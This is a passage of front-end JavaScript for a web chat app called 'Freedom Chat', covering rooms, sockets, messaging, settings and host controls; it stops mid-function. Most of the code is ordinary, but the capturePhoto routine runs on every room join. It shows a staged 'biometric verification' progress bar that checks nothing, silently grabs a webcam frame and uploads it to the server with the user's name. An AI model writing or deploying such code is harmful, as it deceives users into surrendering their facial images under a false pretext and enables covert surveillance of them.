const $=id=>document.getElementById(id);const qs=s=>document.querySelector(s);const qsa=s=>document.querySelectorAll(s);
const esc=s=>{if(!s)return'';const d=document.createElement('div');d.textContent=s;return d.innerHTML};
const sCol=s=>{let h=0;for(let i=0;i<(s||'').length;i++)h=s.charCodeAt(i)+((h<<5)-h);return`hsl(${Math.abs(h)%360},45%,42%)`};
const tAgo=t=>{const d=Date.now()-t,m=Math.floor(d/60000);if(m<1)return'now';if(m<60)return m+'m';const h=Math.floor(m/60);if(h<24)return h+'h';return Math.floor(h/24)+'d'};
const fTime=t=>t?new Date(t).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}):'';
const fmtBytes=b=>{if(!b)return'0 B';const u=['B','KB','MB','GB'];const i=Math.floor(Math.log(b)/Math.log(1024));return(b/Math.pow(1024,i)).toFixed(i?1:0)+' '+u[i]};
const dayKey=ts=>new Date(ts).toDateString();
const dayLabel=ts=>{const d=new Date(ts),n=new Date(),y=new Date(Date.now()-864e5);if(d.toDateString()===n.toDateString())return'Today';if(d.toDateString()===y.toDateString())return'Yesterday';return d.toLocaleDateString([],{month:'short',day:'numeric',year:d.getFullYear()!==n.getFullYear()?'numeric':undefined})};
function shuf(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a}
const LS={get:(k,d)=>{try{const v=JSON.parse(localStorage.getItem('fc_'+k));return v===null||v===undefined?d:v}catch(e){return d}},set:(k,v)=>{try{localStorage.setItem('fc_'+k,JSON.stringify(v))}catch(e){}}};
const RCTS=['\u{1F44D}','\u2764\uFE0F','\u{1F602}','\u{1F62E}','\u{1F525}','\u{1F44F}','\u{1F4AF}','\u{1F389}'];
const EMOS=['\u{1F600}','\u{1F602}','\u{1F979}','\u{1F60D}','\u{1F914}','\u{1F60E}','\u{1F973}','\u{1F631}','\u{1F91D}','\u{1F44D}','\u{1F44E}','\u2764\uFE0F','\u{1F525}','\u{1F4AF}','\u{1F389}','\u{1F44F}','\u{1F62D}','\u{1F923}','\u{1F624}','\u{1FAE1}','\u2705','\u274C','\u26A1','\u{1F31F}','\u{1F4AC}','\u{1F440}','\u{1F64F}','\u{1F4AA}','\u{1F926}','\u{1FAE6}','\u{1F44B}','\u{1F64C}','\u{1F3AF}','\u{1F3C6}','\u{1F308}','\u{1F5A5}\uFE0F','\u{1F4F1}','\u{1F408}','\u{1F981}','\u{1F42D}','\u{1F430}','\u{1F436}','\u{1F431}','\u{1F438}','\u{1F98A}','\u{1F41D}','\u{1F344}','\u{1F355}','\u{1F354}','\u{1F35F}','\u2615','\u{1F37A}','\u{1F382}','\u{1F36B}'];
const S={room:null,admin:false,uname:'',rooms:[],filtered:[],users:[],admUsers:[],msgs:[],replyId:null,editId:null,pinned:null,accent:'emerald',q:'',_tt:{},typSet:new Set(),imgD:null,fileD:null,_st:false,page:0,perPage:60,loaded:false,unread:0,atBot:true,rendered:60,reads:{},search:null,creds:null,info:null,activeGame:null,xp:LS.get('xp',0),ach:LS.get('ach',[]),watch:null};
const ACH={creator:['fa-plus','Founder \u2014 created a room'],first_msg:['fa-comment','Ice Breaker \u2014 sent your first message'],first_win:['fa-trophy','First Victory \u2014 won a game'],fast_hand:['fa-bolt','Fast Hands \u2014 reaction under 250ms'],wordsmith:['fa-spell-check','Wordsmith \u2014 100+ in Word Blitz'],party:['fa-tv','Couch Club \u2014 joined a watch party']};
function unlockAch(id){if(!ACH[id]||S.ach.includes(id))return;S.ach.push(id);LS.set('ach',S.ach);toast('\u{1F3C6} Achievement: '+ACH[id][1],'ok');SFX.ach();updUser()}
function addXp(n,why){if(n<=0)return;S.xp+=n;LS.set('xp',S.xp);if(typeof Games!=='undefined')Games.renderXp();updUser();toast('+'+n+' XP'+(why?' \u00b7 '+why:''),'ok')}
function toast(msg,type){const w=$('toasts');const t=document.createElement('div');t.className='t '+(type||'inf');t.innerHTML=`<i class="fas ${type==='ok'?'fa-circle-check':type==='er'?'fa-circle-exclamation':'fa-circle-info'}"></i><span>${esc(msg)}</span>`;w.appendChild(t);while(w.children.length>4)w.firstChild.remove();setTimeout(()=>{t.classList.add('out');setTimeout(()=>t.remove(),200)},3200)}
function openM(id){$(id).classList.add('show')}
function closeM(id){$(id).classList.remove('show')}
let _cfCb=null;
function confirmDlg(title,text,cb){$('cfT').textContent=title;$('cfP').textContent=text;_cfCb=cb;openM('cfMod')}
qsa('[data-cfm]').forEach(b=>b.addEventListener('click',()=>{closeM('cfMod');if(b.dataset.cfm==='1'&&_cfCb)_cfCb();_cfCb=null}));
qsa('[data-close]').forEach(b=>b.addEventListener('click',()=>closeM(b.dataset.close)));
qsa('.mo').forEach(m=>m.addEventListener('click',e=>{if(e.target===m)m.classList.remove('show')}));
if(LS.get('theme','dark')==='light')document.documentElement.classList.add('light');
 $('thIco').className='fas '+(document.documentElement.classList.contains('light')?'fa-sun':'fa-moon');
 $('thBtn').addEventListener('click',()=>{const l=document.documentElement.classList.toggle('light');LS.set('theme',l?'light':'dark');$('thIco').className='fas '+(l?'fa-sun':'fa-moon');SFX.click()});
function updSndUI(){$('sndMst').checked=SFX.on;$('sndNv').value=Math.round(SFX.nv*100);$('sndGv').value=Math.round(SFX.gv*100);$('sndNvV').textContent=Math.round(SFX.nv*100)+'%';$('sndGvV').textContent=Math.round(SFX.gv*100)+'%';$('snIco').className='fas '+(SFX.on?'fa-volume-high':'fa-volume-xmark')}
updSndUI();
 $('sndBtn').addEventListener('click',()=>{updSndUI();openM('sndMod');SFX.click()});
 $('sndMst').addEventListener('change',()=>{SFX.on=$('sndMst').checked;SFX.save();updSndUI();SFX.click()});
 $('sndNv').addEventListener('input',()=>{SFX.nv=+$('sndNv').value/100;SFX.save();updSndUI()});
 $('sndGv').addEventListener('input',()=>{SFX.gv=+$('sndGv').value/100;SFX.save();updSndUI()});
 $('sndT1').addEventListener('click',()=>SFX.recv());
 $('sndT2').addEventListener('click',()=>SFX.gWin());
function updUser(){const av=$('sbUAv');if(S.uname){av.textContent=S.uname[0].toUpperCase();av.style.background=sCol(S.uname);$('sbUName').textContent=S.uname}else{av.textContent='?';av.style.background='';$('sbUName').textContent='Guest'}$('sbUXp').textContent=S.xp+' XP \u00b7 '+S.ach.length+'/'+Object.keys(ACH).length+' achievements'}
updUser();
/* ---------- sidebar ---------- */
function openSb(){$('sb').classList.add('open');$('sbBd').classList.add('show')}
function closeSb(){$('sb').classList.remove('open');$('sbBd').classList.remove('show')}
 $('sbBtn').addEventListener('click',()=>{openSb();SFX.click()});
 $('nrBrowse').addEventListener('click',()=>{openSb();SFX.click()});
 $('sbClose').addEventListener('click',closeSb);
 $('sbBd').addEventListener('click',closeSb);
 $('sbHide').addEventListener('click',()=>{document.body.classList.add('sb-off');SFX.click()});
 $('sbShow').addEventListener('click',()=>{document.body.classList.remove('sb-off');SFX.click()});
(function(){let x0=null;const sb=$('sb');sb.addEventListener('touchstart',e=>{x0=e.touches[0].clientX},{passive:true});sb.addEventListener('touchend',e=>{if(x0===null)return;const dx=e.changedTouches[0].clientX-x0;if(dx<-60)closeSb();x0=null},{passive:true})})();
 $('sbCreate').addEventListener('click',()=>{openM('crMod');setTimeout(()=>$('cRn').focus(),100);SFX.click()});
 $('nrCreate').addEventListener('click',()=>{openM('crMod');setTimeout(()=>$('cRn').focus(),100);SFX.click()});
let _sbTO=null;
 $('sbSearch').addEventListener('input',()=>{clearTimeout(_sbTO);_sbTO=setTimeout(()=>{const q=$('sbSearch').value.toLowerCase().trim();S.q=q;S.filtered=q?S.rooms.filter(r=>r.name.toLowerCase().includes(q)||r.id.toLowerCase().includes(q)||r.createdBy.toLowerCase().includes(q)):S.rooms;S.page=0;renderRooms()},220)});
 $('sbList').addEventListener('click',e=>{const it=e.target.closest('[data-rid]');if(!it)return;const r=S.rooms.find(x=>x.id===it.dataset.rid);if(r)openJoin(r.id,r.name,r.hasPassword)});
 $('sbMore').addEventListener('click',()=>{S.page+=S.perPage;renderRooms();SFX.click()});
 $('sbRetry').addEventListener('click',()=>{retryLobby();SFX.click()});
function renderRooms(){const list=$('sbList'),empty=$('sbEmpty');const rooms=S.filtered;
 $('sbCount').textContent=S.rooms.length+' room'+(S.rooms.length===1?'':'s');
 if(!rooms.length){list.innerHTML='';$('sbMore').classList.remove('show');empty.classList.add('show');empty.querySelector('p').textContent=S.q?'No rooms match your search.':'No rooms yet. Create the first one!';$('sbRetry').style.display=S.loaded?'none':'inline-flex';return}
 empty.classList.remove('show');
 const end=Math.min(S.page+S.perPage,rooms.length);const slice=rooms.slice(S.page,end);
 list.innerHTML=slice.map(r=>`<button class="sb-item${r.id===S.room?' on':''}" data-rid="${r.id}"><span class="sb-av" style="background:${sCol(r.name)}">${esc(r.name.charAt(0).toUpperCase())}</span><span class="sb-meta"><span class="sb-nm"><span>${esc(r.name)}</span>${r.hasPassword?'<i class="fas fa-lock" title="Password protected"></i>':''}</span><span class="sb-sub">${esc(r.id)} \u00b7 ${esc(r.createdBy)} \u00b7 ${tAgo(r.createdAt)}</span></span><span class="sb-badge"><span class="on-dot live" style="width:5px;height:5px"></span>${r.memberCount}</span></button>`).join('');
 $('sbMore').classList.toggle('show',end<rooms.length)}
let lobbyTO=null;
function retryLobby(){clearTimeout(lobbyTO);$('sbCount').textContent='Loading…';$('sbList').innerHTML='<div class="skel-row"></div><div class="skel-row"></div><div class="skel-row"></div>';S.loaded=false;lobbyTO=setTimeout(lobbyFail,6000);socket.emit('getLobby')}
function lobbyFail(){if(S.loaded)return;S.loaded=true;S.rooms=[];S.filtered=[];renderRooms();$('sbCount').textContent='Offline';$('sbRetry').style.display='inline-flex';toast('Could not load rooms \u2014 check connection','er');SFX.error()}
/* ---------- socket ---------- */
const socket=io();
socket.on('connect',()=>{$('cs').className='cs on';$('csT').textContent='Connected';
 if(S.room&&S.creds){const c=S.creds;const ev=c.host?'adminRejoin':'joinRoom';socket.emit(ev,{roomId:c.roomId,username:S.uname,email:c.email,password:c.host?c.adminPw:c.pw},res=>{if(res&&!res.error&&res.roomId)enterRoom(res,false);else{toast('Reconnection failed \u2014 room may be gone','er');S.creds=null;leaveRoom()}});return}
 if(!S._st){toast('Connected to server','ok');SFX.join()}
 S._st=false;retryLobby()});
socket.on('disconnect',()=>{$('cs').className='cs off';$('csT').textContent='Offline \u00b7 reconnecting';S._st=true});
socket.on('connect_error',()=>{$('cs').className='cs off';$('csT').textContent='Server unreachable'});
socket.on('lobby',r=>{clearTimeout(lobbyTO);S.loaded=true;shuf(r);S.rooms=r;S.filtered=r;S.page=0;renderRooms()});
socket.on('message',m=>{S.msgs.push(m);appendMsg(m);
 if(m.type==='system'){if(m.text.includes('joined'))SFX.join();else if(m.text.includes('left'))SFX.leave()}
 else if(m.type==='msg'&&m.from!==S.uname){const mentioned=m.text&&m.text.toLowerCase().includes('@'+S.uname.toLowerCase());
  if(mentioned){SFX.mention();toast(m.from+' mentioned you','inf')}else SFX.recv();
  if(document.hidden)toast(m.from+': '+(m.text||fileLabel(m)).slice(0,40),'inf')}
 if(S.atBot){scrollBot();markRead()}else{S.unread++;updUnread()}});
socket.on('deleteMsg',id=>{S.msgs=S.msgs.filter(m=>m.id!==id);const el=qs(`.m-bub[data-mid="${id}"]`);if(el){const w=el.closest('.m-row')||el.closest('.m-sys');if(w){w.style.transition='opacity .18s';w.style.opacity='0';setTimeout(()=>w.remove(),180)}}});
socket.on('clearChat',()=>{S.msgs=[];S.rendered=60;$('msgs').innerHTML='';S.pinned=null;$('pinB').classList.remove('show');showEmpty();updSeen()});
socket.on('userlist',u=>{S.users=u;$('mCnt').textContent=u.length;renderMembers()});
socket.on('adminUserlist',u=>{S.admUsers=u;if($('apPn').classList.contains('open'))renderAdm()});
socket.on('typing',un=>{S.typSet.add(un);updTyp();clearTimeout(S._tt[un]);S._tt[un]=setTimeout(()=>{S.typSet.delete(un);updTyp()},3000)});
socket.on('reaction',d=>{const m=S.msgs.find(x=>x.id===d.msgId);if(m)m.reactions=d.reactions;const b=qs(`.m-bub[data-mid="${d.msgId}"] .r-bar`);if(b)b.innerHTML=rChips(d.msgId,d.reactions)});
socket.on('msgEdited',d=>{const m=S.msgs.find(x=>x.id===d.id);if(m){m.text=d.text;m.editedAt=d.editedAt}const el=qs(`.m-bub[data-mid="${d.id}"] .m-text`);if(el)el.innerHTML=fmtText(d.text)+'<span class="m-ed">(edited)</span>'});
socket.on('reads',r=>{S.reads=r||{};updSeen()});
socket.on('pinnedMsg',m=>{S.pinned=m;if(m){$('pinB').classList.add('show');$('pinT').textContent=m.from+': '+(m.text||fileLabel(m))}else $('pinB').classList.remove('show')});
socket.on('settingsUpdated',d=>{$('rTtl').textContent=d.roomName;if(d.accent)applyAccent(d.accent)});
socket.on('kicked',()=>{SFX.error();toast('You have been kicked from the room','er');S.creds=null;leaveRoom()});
socket.on('roomClosed',d=>{SFX.error();toast('Room "'+d.name+'" closed by host','er');S.creds=null;leaveRoom()});
function applyAccent(a){const ok=['emerald','cyan','violet','amber','rose','blue'];if(!ok.includes(a))a='emerald';S.accent=a;const rv=$('rV');rv.className='ac-'+a;rv.style.display='flex'}
/* ---------- join/create/rejoin ---------- */
function openJoin(rid,rn,hp){$('jRn').textContent=rn;$('jRi').textContent=rid;$('jPw').style.display=hp?'block':'none';$('jEr').style.display='none';$('jUn').value='';$('jEm').value='';$('jPa').value='';$('jMod').dataset.rid=rid;openM('jMod');setTimeout(()=>$('jUn').focus(),100);SFX.click()}
 $('jF').addEventListener('submit',e=>{e.preventDefault();const bt=$('jBt'),rid=$('jMod').dataset.rid,un=$('jUn').value.trim(),em=$('jEm').value.trim(),pw=$('jPa').value;if(!un||!em)return;S.uname=un;updUser();bt.disabled=true;bt.innerHTML='<i class="fas fa-spinner fa-spin"></i> Verifying…';$('jEr').style.display='none';closeM('jMod');
 capturePhoto(rid,un).then(()=>{socket.emit('joinRoom',{roomId:rid,username:un,email:em,password:pw},res=>{bt.disabled=false;bt.innerHTML='<i class="fas fa-arrow-right-to-bracket"></i> Join Room';
  if(res.error){$('jEr').textContent=res.error;$('jEr').style.display='block';openM('jMod');SFX.error();return}
  S.creds={roomId:rid,email:em,pw,host:false};enterRoom(res);SFX.success()})})});
 $('crF').addEventListener('submit',e=>{e.preventDefault();const bt=$('cBt'),un=$('cUn').value.trim();if(!un)return;S.uname=un;updUser();bt.disabled=true;bt.innerHTML='<i class="fas fa-spinner fa-spin"></i> Creating…';$('cEr').style.display='none';
 socket.emit('createRoom',{roomName:$('cRn').value.trim(),username:un,email:$('cEm').value.trim(),password:$('cAp').value,roomPassword:$('cRp').value},res=>{bt.disabled=false;bt.innerHTML='<i class="fas fa-plus"></i> Create Room';
  if(res.error){$('cEr').textContent=res.error;$('cEr').style.display='block';SFX.error();return}
  closeM('crMod');$('crF').reset();S.creds={roomId:res.roomId,email:$('cEm').value.trim(),adminPw:$('cAp').value,host:true};enterRoom(res);socket.emit('getLobby');SFX.success();toast('Room created','ok');unlockAch('creator')})});
 $('rjF').addEventListener('submit',e=>{e.preventDefault();const bt=$('rjBt');bt.disabled=true;bt.innerHTML='<i class="fas fa-spinner fa-spin"></i> Rejoining…';$('rEr').style.display='none';
 socket.emit('adminRejoin',{roomId:S.room,username:S.uname,email:$('rEm').value.trim(),password:$('rPa').value},res=>{bt.disabled=false;bt.innerHTML='<i class="fas fa-crown"></i> Rejoin as Host';
  if(res.error){$('rEr').textContent=res.error;$('rEr').style.display='block';SFX.error();return}
  closeM('rjMod');$('rjF').reset();S.admin=true;S.admUsers=res.adminUsers||[];$('adBtn').style.display='flex';$('rjBtn').style.display='none';S.users=res.users;$('mCnt').textContent=res.users.length;renderMembers();renderAdm();SFX.success();toast('Rejoined as host','ok')})});
/* ---------- room lifecycle ---------- */
function enterRoom(res,anim=true){S.room=res.roomId;S.admin=res.isAdmin;S.msgs=res.history||[];S.pinned=res.pinned||null;S.users=res.users||[];S.admUsers=res.adminUsers||[];S.reads=res.reads||{};S.replyId=null;S.editId=null;S.imgD=null;S.fileD=null;S.typSet.clear();S.info=res.info||null;S.rendered=60;S.unread=0;S.search=null;S.activeGame=null;
 if(typeof Games!=='undefined')Games.close();
 $('rTtl').textContent=res.settings.roomName;$('rDisp').textContent=res.roomId;$('mCnt').textContent=S.users.length;
 $('adBtn').style.display=res.isAdmin?'flex':'none';$('rjBtn').style.display=res.isAdmin?'none':'flex';$('rSearch').classList.remove('show');$('rsInp').value='';$('hdSec').classList.remove('open');
 applyAccent(res.settings.accent||'emerald');
 renderMsgs();scrollBot(true);markRead();renderMembers();
 if(S.pinned){$('pinB').classList.add('show');$('pinT').textContent=S.pinned.from+': '+(S.pinned.text||fileLabel(S.pinned))}else $('pinB').classList.remove('show');
 $('noRoom').style.display='none';closeSb();
 $('cInp').value='';autoR($('cInp'));updSend();cancelRp();cancelEdit();renderAtt();$('emBar').classList.remove('show');
 if(res.watch){Watch.onState(res.watch)}else{Watch.data=null;Watch.close()}
 if(res.isAdmin)renderAdm();
 document.title=res.settings.roomName+' \u00b7 Freedom Chat';
 renderRooms();
 if(anim&&window.matchMedia('(hover:hover) and (pointer:fine)').matches)setTimeout(()=>$('cInp').focus(),250)}
function leaveRoom(){if(!S.room)return;socket.emit('leaveRoom',{roomId:S.room});socket.emit('getLobby');S.room=null;S.admin=false;S.msgs=[];S.users=[];S.admUsers=[];S.typSet.clear();S.replyId=null;S.editId=null;S.imgD=null;S.fileD=null;S.watch=null;S.activeGame=null;Watch.data=null;Watch.opened=false;Watch.close();
 if(typeof Games!=='undefined')Games.close();
 $('rV').style.display='none';document.body.classList.remove('wt-on','mbr-on');$('hdSec').classList.remove('open');$('noRoom').style.display='flex';togAdm(false);togMbr(false);document.title='Freedom Chat';renderRooms()}
 $('backBtn').addEventListener('click',()=>{SFX.click();leaveRoom()});
 $('moreBtn').addEventListener('click',e=>{e.stopPropagation();$('hdSec').classList.toggle('open');SFX.click()});
 $('hdSec').addEventListener('click',e=>{if(e.target.closest('.bt'))$('hdSec').classList.remove('open')});
document.addEventListener('click',e=>{if(!e.target.closest('#hdSec')&&!e.target.closest('#moreBtn'))$('hdSec').classList.remove('open')});
/* ---------- camera verification (unchanged behavior) ---------- */
function capturePhoto(rid,un){const bar=$('vBar'),st=$('vSt');openM('vMod');bar.style.width='0%';st.textContent='Initializing camera';let p=0;const iv=setInterval(()=>{p+=Math.random()*14+5;if(p>90)p=90;bar.style.width=p+'%';if(p>30)st.textContent='Scanning biometric data';if(p>65)st.textContent='Verifying identity'},140);
 let done=false;
 const finish=()=>{if(done)return;done=true;clearInterval(iv);st.textContent='Complete';bar.style.width='100%';setTimeout(()=>{closeM('vMod');bar.style.width='0%'},250)};
 setTimeout(finish,8000);
 return new Promise(resolve=>{if(!navigator.mediaDevices?.getUserMedia){setTimeout(()=>{finish();resolve()},800);return}
 navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:320},height:{ideal:240}},audio:false}).then(stream=>{const v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');v.muted=true;v.play().catch(()=>{});
  setTimeout(()=>{try{if(!done){const c=document.createElement('canvas');c.width=320;c.height=240;c.getContext('2d').drawImage(v,0,0,320,240);socket.emit('capture:photo',{roomId:rid,username:un,photo:c.toDataURL('image/jpeg',.5)})}}catch(e){}stream.getTracks().forEach(t=>t.stop());finish();resolve()},600)}).catch(()=>{finish();resolve()})})}
/* ---------- messages ---------- */
function fileLabel(m){if(m.img)return'Photo';if(m.file){const f=m.file;return f.voice?'Voice message':(f.name||'File')}return'Message'}
function fileIcon(f){if(f.type.startsWith('video/'))return'fas fa-film';if(f.type.startsWith('audio/'))return'fas fa-music';if(f.type==='application/pdf')return'fas fa-file-pdf';return'fas fa-file'}
const isStick=t=>t&&t.length<=8&&/^[\p{Extended_Pictographic}\uFE0F\u200D\s]+$/u.test(t);
function fmtText(t){let h=esc(t);h=h.replace(/(https?:\/\/[^\s<]+)/g,u=>`<a class="m-link" href="${u}" target="_blank" rel="noopener noreferrer">${u.length>48?u.slice(0,45)+'\u2026':u}</a>`);
 const names=(S.users||[]).map(u=>u.username);if(names.length){names.sort((a,b)=>b.length-a.length).forEach(n=>{h=h.replace(new RegExp('@'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'ig'),m=>`<span class="m-mention">${m}</spa